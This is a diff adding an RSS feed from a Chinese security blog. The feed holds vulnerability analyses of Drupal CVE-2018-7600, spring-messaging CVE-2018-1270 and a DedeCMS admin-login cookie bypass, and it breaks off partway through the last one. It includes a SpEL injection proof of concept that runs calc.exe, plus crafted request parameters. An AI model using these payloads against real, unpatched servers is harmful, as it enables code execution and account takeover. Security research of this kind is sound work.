@@ -1,0 +1,1133 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Vul on 诗与胡说</title>
+    <link>https://kylingit.com/tags/vul/index.xml</link>
+    <description>Recent content in Vul on 诗与胡说</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh_cn</language>
+    <copyright>Copyright © 2018 kylinking</copyright>
+    <atom:link href="https://kylingit.com/tags/vul/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2018-7600 Drupal 内核远程代码执行漏洞分析</title>
+      <link>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Fri, 13 Apr 2018 23:05:34 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2018-7600-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/sa-core-2018-002&#34;&gt;https://www.drupal.org/sa-core-2018-002&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;
+
+&lt;p&gt;Drupal 6.x，7.x，8.x&lt;/p&gt;
+
+&lt;p&gt;修复版本
+Drupal 7.58，Drupal 8.5.1&lt;/p&gt;
+
+&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;
+
+&lt;p&gt;历史版本
+&lt;a href=&#34;https://www.drupal.org/project/drupal/releases&#34;&gt;https://www.drupal.org/project/drupal/releases&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x04-流程梳理&#34;&gt;0x04 流程梳理&lt;/h4&gt;
+
+&lt;p&gt;先来理清一下Drupal处理表单的情况。更详细的可以看&lt;a href=&#34;http://www.thinkindrupal.com/node/1100&#34;&gt;文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Drupal提供了一个应用程序接口（API），用来生成、验证和处理HTML表单。表单API将表单抽象为一个嵌套数组，里面包含了属性和值。在生成页面时，表单呈现引擎会在适当的时候将数组呈现出来。&lt;/p&gt;
+
+&lt;p&gt;模块使用关联数组向Drupal描述表单。Drupal的表单引擎负责为要显示的表单生成HTML，并使用三个阶段来安全的处理提交了的表单：验证、提交、重定向。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Drupal比较特殊，它不像大部分cms通过html直接渲染页面，而是把接收的数据交给&lt;code&gt;core/lib/Drupal/Core/Form/FormBuilder.php&lt;/code&gt;的&lt;code&gt;buildForm()&lt;/code&gt;方法处理，&lt;code&gt;buildForm()&lt;/code&gt;经过处理后返回一个结构体(数组)，数组通过引擎生成HTML。&lt;/p&gt;
+
+&lt;p&gt;当我们提交一个表单(例如注册页面)，&lt;code&gt;buildForm()&lt;/code&gt;方法会根据&lt;code&gt;$form_id&lt;/code&gt;取出数据，经过一系列处理后返回一个树形结构，这个结构就是通过数组存储的，就是我们看到的类似&lt;code&gt;[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][]&lt;/code&gt;的结构，数组每个元素作为一个叶子节点，后续就把整个&lt;code&gt;form&lt;/code&gt;结构渲染出页面。&lt;/p&gt;
+
+&lt;p&gt;当我们在注册页面上传一张图片的时候，&lt;code&gt;form&lt;/code&gt;结构被传给&lt;code&gt;core/modules/file/src/Element/ManagedFile.php&lt;/code&gt;的&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;方法，这个方法用来处理上传文件的情况&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; public static function uploadAjaxCallback(&amp;amp;$form, FormStateInterface &amp;amp;$form_state, Request $request) {
+    /** @var \Drupal\Core\Render\RendererInterface $renderer */
+    $renderer = \Drupal::service(&#39;renderer&#39;);
+
+    $form_parents = explode(&#39;/&#39;, $request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;));
+
+    // Retrieve the element to be rendered.
+    $form = NestedArray::getValue($form, $form_parents);
+
+    // Add the special AJAX class if a new file was added.
+    $current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
+    if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
+      $form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
+    }
+    // Otherwise just add the new content class on a placeholder.
+    else {
+      $form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
+    }
+
+    $status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
+    $form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
+    $output = $renderer-&amp;gt;renderRoot($form);
+
+    $response = new AjaxResponse();
+    $response-&amp;gt;setAttachments($form[&#39;#attached&#39;]);
+
+    return $response-&amp;gt;addCommand(new ReplaceCommand(NULL, $output));
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/8b1t3&#34; alt=&#34;upload&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Q3ys0&#34; alt=&#34;form_parents&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;问题就出现在&lt;code&gt;$request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;)&lt;/code&gt;这个地方，&lt;code&gt;$form_parents&lt;/code&gt;父节点的值是从&lt;code&gt;get()&lt;/code&gt;取出&lt;code&gt;element_parents&lt;/code&gt;参数传进去的，进入下面的&lt;code&gt;NestedArray::getValue()&lt;/code&gt;方法，&lt;code&gt;getValue()&lt;/code&gt;的作用是接收一个节点，把这个节点下的叶子节点全部遍历出来，再根据叶子节点的&lt;code&gt;key-value&lt;/code&gt;值进行后续操作。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/39ciX&#34; alt=&#34;getValue&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/f8qiO&#34; alt=&#34;user_picture&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;按理说这样的功能很正常，关键就在于这个&lt;code&gt;element_parents&lt;/code&gt;正是我们可以控制的，也就是说我们可以指定&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;渲染我们给它的参数，而这个参数可以是恶意的。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;
+
+&lt;p&gt;那么我们传进去什么参数呢？我们先来测试一下，正常注册流程，&lt;code&gt;mail&lt;/code&gt;参数传进去一个数组的话会怎么样&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KJE50&#34; alt=&#34;mail&#34; /&gt;
+可以看到我们构造的“子节点”被存储在&lt;code&gt;mail-value&lt;/code&gt;下，如果要取出这个值就得让上面提到的&lt;code&gt;getValue()&lt;/code&gt;接收这个参数，所以我们构造&lt;code&gt;element_parents=account/name/%23value&lt;/code&gt;，这样子&lt;code&gt;getValue()&lt;/code&gt;就会遍历出我们构造的参数&lt;/p&gt;
+
+&lt;p&gt;现在参数已经能够传进去了，那么在哪里执行呢？继续往下跟&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
+if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
+	$form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
+}
+// Otherwise just add the new content class on a placeholder.
+else {
+	$form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
+}
+
+$status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
+$form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
+$output = $renderer-&amp;gt;renderRoot($form);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到经过&lt;code&gt;getValue()&lt;/code&gt;遍历出来的叶子节点(就是此时的&lt;code&gt;form&lt;/code&gt;)被传进&lt;code&gt;$renderer-&amp;gt;renderRoot()&lt;/code&gt;方法，跟进去看一下&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;core/lib/Drupal/Core/Render/Renderer.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  public function render(&amp;amp;$elements, $is_root_call = FALSE) {
+...
+    try {
+      return $this-&amp;gt;doRender($elements, $is_root_call);
+    }
+    catch (\Exception $e) {
+      // Mark the ::rootRender() call finished due to this exception &amp;amp; re-throw.
+      $this-&amp;gt;isRenderingRoot = FALSE;
+      throw $e;
+    }
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;调用&lt;code&gt;doRender()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/6Htxw&#34; alt=&#34;doRender&#34; /&gt;
+这个方法比较长，但是我们从中找到了几处执行&lt;code&gt;call_user_func()&lt;/code&gt;的地方，先看一下第三处&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (isset($elements[&#39;#post_render&#39;])) {
+    foreach ($elements[&#39;#post_render&#39;] as $callable) {
+        if (is_string($callable) &amp;amp;&amp;amp; strpos($callable, &#39;::&#39;) === FALSE) {
+            $callable = $this-&amp;gt;controllerResolver-&amp;gt;getControllerFromDefinition($callable);
+        }
+        $elements[&#39;#children&#39;] = call_user_func($callable, $elements[&#39;#children&#39;], $elements);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;接收的第一个参数&lt;code&gt;$elements[&#39;#post_render&#39;]&lt;/code&gt;作为函数，第二个参数&lt;code&gt;$elements[&#39;#children&#39;]&lt;/code&gt;作为参数，在上面被赋值&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!$theme_is_implemented &amp;amp;&amp;amp; isset($elements[&#39;#markup&#39;])) {
+    $elements[&#39;#children&#39;] = Markup::create($elements[&#39;#markup&#39;] . $elements[&#39;#children&#39;]);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这两个参数都是我们可控的，于是造成一个代码执行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/jHlV8&#34; alt=&#34;call_user_func&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回头看一下这处&lt;code&gt;call_user_func_array&lt;/code&gt;，这里的&lt;code&gt;$callable&lt;/code&gt;和&lt;code&gt;$args&lt;/code&gt;两个参数实际上也是可控的，通过&lt;code&gt;#lazy_builder&lt;/code&gt;属性传进来，checkpoint的分析报告正是分析了这个地方&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/QlR23&#34; alt=&#34;call_user_func_array&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h4&gt;
+
+&lt;p&gt;关注这个漏洞也是好长时间了，当时粗略看了一下，因为补丁直接对入口进行了过滤，要找到真正触发的地方太难了，所以也迟迟不见PoC出来。checkpoint的分析报告出来后好好跟了一遍，不得不感叹人家真厉害(逃&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;这个漏洞关键点有两个，一个是&lt;code&gt;uploadAjaxCallback&lt;/code&gt;里&lt;code&gt;$form_parents&lt;/code&gt;由get直接传进参数，这里就存在风险；
+另一处&lt;code&gt;call_user_func&lt;/code&gt;两个参数均可控，两者结合造成一个严重的远程代码执行漏洞，看分析报告如何一步步构造利用链，可谓是十分精彩了。&lt;/p&gt;
+
+&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/uncovering-drupalgeddon-2/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/a2u/CVE-2018-7600&#34;&gt;https://github.com/a2u/CVE-2018-7600&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CVE-2018-1270 spring-messaging Remote Code Execution 分析</title>
+      <link>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</link>
+      <pubDate>Wed, 11 Apr 2018 11:07:18 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://pivotal.io/security/cve-2018-1270&#34;&gt;CVE-2018-1270: Remote Code Execution with spring-messaging&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Spring Framework 5.0 to 5.0.4&lt;/li&gt;
+&lt;li&gt;Spring Framework 4.3 to 4.3.15&lt;/li&gt;
+&lt;li&gt;Older unsupported versions are also affected&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
+git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;
+
+&lt;p&gt;在app.js中增加一个header头&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function connect() {
+    var header  = {&amp;quot;selector&amp;quot;:&amp;quot;T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)&amp;quot;};
+    var socket = new SockJS(&#39;/gs-guide-websocket&#39;);
+    stompClient = Stomp.over(socket);
+    stompClient.connect({}, function (frame) {
+        setConnected(true);
+        console.log(&#39;Connected: &#39; + frame);
+        stompClient.subscribe(&#39;/topic/greetings&#39;, function (greeting) {
+            showGreeting(JSON.parse(greeting.body).content);
+        }, header);
+    });
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;spring-boot:run运行，connect建立连接后，点击发送触发漏洞&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/kVdWA&#34; alt=&#34;clac&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;
+
+&lt;p&gt;在点击发送消息后，spring-message会对消息头部进行处理，相关方法在&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;
+&lt;code&gt;addSubscriptionInternal()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/tvQk8&#34; alt=&#34;selector&#34; /&gt;
+通过&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;确定一个&lt;code&gt;selector&lt;/code&gt;属性，后续服务端就通过这个&lt;code&gt;subsId&lt;/code&gt;来查找特定会话，也就是从&lt;code&gt;headers&lt;/code&gt;头部信息查找&lt;code&gt;selector&lt;/code&gt;，由&lt;code&gt;selector&lt;/code&gt;的值作为expression被执行&lt;/p&gt;
+
+&lt;p&gt;点击Send后，&lt;code&gt;org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java&lt;/code&gt;接收到message，message的headers头部信息包含了selector的属性，message传进&lt;code&gt;this.subscriptionRegistry.findSubscriptions&lt;/code&gt;，由&lt;code&gt;findSubscriptions()&lt;/code&gt;进行处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/NUWfs&#34; alt=&#34;sendMessageToSubscribers&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟进相关方法
+&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
+protected MultiValueMap&amp;lt;String, String&amp;gt; findSubscriptionsInternal(String destination, Message&amp;lt;?&amp;gt; message) {
+	MultiValueMap&amp;lt;String, String&amp;gt; result = this.destinationCache.getSubscriptions(destination, message);
+	return filterSubscriptions(result, message);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;result的值作为&lt;code&gt;filterSubscriptions()&lt;/code&gt;的&lt;code&gt;allMatches&lt;/code&gt;参数传入，遍历出&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;，此时的result为&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1AvIp&#34; alt=&#34;result&#34; /&gt;
+跟进&lt;code&gt;filterSubscriptions()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;经过两层for循环，id为&lt;code&gt;sub-0&lt;/code&gt;的subscription被赋值给&lt;code&gt;sub&lt;/code&gt;(P.S. 此图是后来补的，故sessionId不一样)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/wHSXE&#34; alt=&#34;for&#34; /&gt;
+&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/QY3Ep&#34; alt=&#34;sub&#34; /&gt;
+通过&lt;code&gt;sub.getSelectorExpression()&lt;/code&gt;得到&lt;code&gt;expression&lt;/code&gt;的值，此时的&lt;code&gt;expression&lt;/code&gt;就包含着我们发送的表达式&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/zwRxS&#34; alt=&#34;expression&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再往下，执行到&lt;code&gt;expression.getValue()&lt;/code&gt;，SpEL得到执行，触发poc&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/vJ027&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x06-补丁&#34;&gt;0x06 补丁&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&#34;&gt;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&#34;&gt;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://blog.nsfocus.net/spring-messaging-analysis/&#34;&gt;http://blog.nsfocus.net/spring-messaging-analysis/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/104140&#34;&gt;https://www.anquanke.com/post/id/104140&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>DedeCMS V5.7 SP2 第二处缺陷可重置管理员密码</title>
+      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</link>
+      <pubDate>Fri, 19 Jan 2018 15:20:32 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+
+&lt;p&gt;上回分析的dede重置密码漏洞有一定局限性，一是只能影响没有设置密保问题的用户，二是不能重置管理员admin的密码，原因当时也说了，管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。但是前几天又有一个缺陷被爆出来，可以绕过一些判断条件从而从前台登录管理员账户，配合上一个重置密码漏洞，可以达到从前台修改&lt;code&gt;dede_admin&lt;/code&gt;表里是密码，也就是真正修改了管理员密码。&lt;/p&gt;
+
+&lt;p&gt;下面来简单分析一下&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;先来看一下DedeCMS判断登录用户的逻辑
+&lt;code&gt;include/memberlogin.class.php:292&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;function IsLogin()
+{
+    if($this-&amp;gt;M_ID &amp;gt; 0) return TRUE;
+    else return FALSE;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;跟进&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;看一下，170行&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = $this-&amp;gt;GetNum(GetCookie(&amp;quot;DedeUserID&amp;quot;));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;GetNum()&lt;code&gt;include/memberlogin.class.php:398&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/**
+*  获取整数值
+*
+* @access    public
+* @param     string  $fnum  处理的数值
+* @return    string
+*/
+function GetNum($fnum){
+    $fnum = preg_replace(&amp;quot;/[^0-9\.]/&amp;quot;, &#39;&#39;, $fnum);
+    return $fnum;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;正则匹配，去除了数字以外的字符，这里就可以构造一个利用点，一会儿再看&lt;/p&gt;
+
+&lt;p&gt;看一下&lt;code&gt;GetCookie()&lt;/code&gt;
+&lt;code&gt;include/helpers/cookie.helper.php:54&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/IO7Rf&#34; alt=&#34;GetCookie&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;关键点在这个判断条件&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if($_COOKIE[$key.&#39;__ckMd5&#39;] != substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;就是说从cookie中取到&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，与&lt;code&gt;md5($cfg_cookie_encode.$_COOKIE[$key])&lt;/code&gt;取前16位比较，相等才能进行下一步&lt;/p&gt;
+
+&lt;p&gt;我们知道admin的&lt;code&gt;DedeUserID&lt;/code&gt;为1，现在需要知道&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值&lt;/p&gt;
+
+&lt;p&gt;其实再思考一下，就算我们不知道admin的&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，只要能过这个if条件就能绕过接着往下走了，那我们可不可以利用其他用户来绕过if条件呢？&lt;/p&gt;
+
+&lt;p&gt;在本程序中从数据库取用户的过程其实很简单，就是简单的查询语句&lt;code&gt;Select * From #@__member where mid=&#39;$mid&#39;&lt;/code&gt;。当我们利用其他用户的cookie通过了上面的if判断，然后修改mid为admin的id(1)，就可以从前台登录到admin账户。
+那么如何在请求过程中修改&lt;code&gt;DedeUserID&lt;/code&gt;的值让它能和admin的id相等呢？&lt;/p&gt;
+
+&lt;h4 id=&#34;利用点一&#34;&gt;利用点一&lt;/h4&gt;
+
+&lt;p&gt;我们使进入&lt;code&gt;GetNum&lt;/code&gt;方法的参数为&lt;code&gt;数字1+字母&lt;/code&gt;的形式，经过正则替换就会变成&lt;code&gt;1&lt;/code&gt;，也就是&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;的值，然后带入数据库查询&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/4zlB8&#34; alt=&#34;GetNum&#34; /&gt;
+&lt;code&gt;$fnum&lt;/code&gt;为&lt;code&gt;1qqqq&lt;/code&gt;的情况，经过正则替换后值成为了1&lt;/p&gt;
+
+&lt;h4 id=&#34;利用点二&#34;&gt;利用点二&lt;/h4&gt;
+
+&lt;p&gt;在&lt;code&gt;include/memberlogin.class.php:178&lt;/code&gt;有这么一行代码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = intval($this-&amp;gt;M_ID);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;对&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;进行了整数类型转换，假设注册一个用户名，经过&lt;code&gt;intval&lt;/code&gt;转换后为&lt;code&gt;1&lt;/code&gt;就能使查询条件变成&lt;code&gt;Select * From #@__member where mid=&#39;1&#39;&lt;/code&gt;，也就取出了管理员在&lt;code&gt;dede_member&lt;/code&gt;表里的密码，此时配合上一个漏洞，我们已经修改了&lt;code&gt;dede_member&lt;/code&gt;中管理员的密码，只要在前台再进行一次修改密码操作，就能真正修改admin的密码。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Av52c&#34; alt=&#34;intval&#34; /&gt;
+这是调试的时候注册用户名为&lt;code&gt;0000001&lt;/code&gt;的情况，经过&lt;code&gt;intval&lt;/code&gt;转换后&lt;code&gt;M_ID&lt;/code&gt;的值变成了1&lt;/p&gt;
+
+&lt;p&gt;下面看一下如何从前台登录admin账户&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;index.php&lt;/code&gt;里有一个&lt;code&gt;最近访客记录&lt;/code&gt;的功能，&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;else
+{
+    require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;);
+    if($action == &#39;&#39;)
+    {
+        include_once(DEDEINC.&amp;quot;/channelunit.func.php&amp;quot;);
+        $dpl = new DedeTemplate();
+        $tplfile = DEDEMEMBER.&amp;quot;/space/{$_vars[&#39;spacestyle&#39;]}/index.htm&amp;quot;;
+
+        //更新最近访客记录及站点统计记录
+        $vtime = time();
+        $last_vtime = GetCookie(&#39;last_vtime&#39;);
+        $last_vid = GetCookie(&#39;last_vid&#39;);
+        if(empty($last_vtime))
+        {
+            $last_vtime = 0;
+        }
+        if($vtime - $last_vtime &amp;gt; 3600 || !preg_match(&#39;#,&#39;.$uid.&#39;,#i&#39;, &#39;,&#39;.$last_vid.&#39;,&#39;) )
+        {
+            if($last_vid!=&#39;&#39;)
+            {
+                $last_vids = explode(&#39;,&#39;,$last_vid);
+                $i = 0;
+                $last_vid = $uid;
+                foreach($last_vids as $lsid)
+                {
+                    if($i&amp;gt;10)
+                    {
+                        break;
+                    }
+                    else if($lsid != $uid)
+                    {
+                        $i++;
+                        $last_vid .= &#39;,&#39;.$last_vid;
+                    }
+                }
+            }
+            else
+            {
+                $last_vid = $uid;
+            }
+            PutCookie(&#39;last_vtime&#39;, $vtime, 3600*24, &#39;/&#39;);
+            PutCookie(&#39;last_vid&#39;, $last_vid, 3600*24, &#39;/&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;else条件是当访问页面&lt;code&gt;http://127.0.0.1/dedecms/uploads/member/index.php?uid=1111&lt;/code&gt;传入的uid不为空时进入&lt;/p&gt;
+
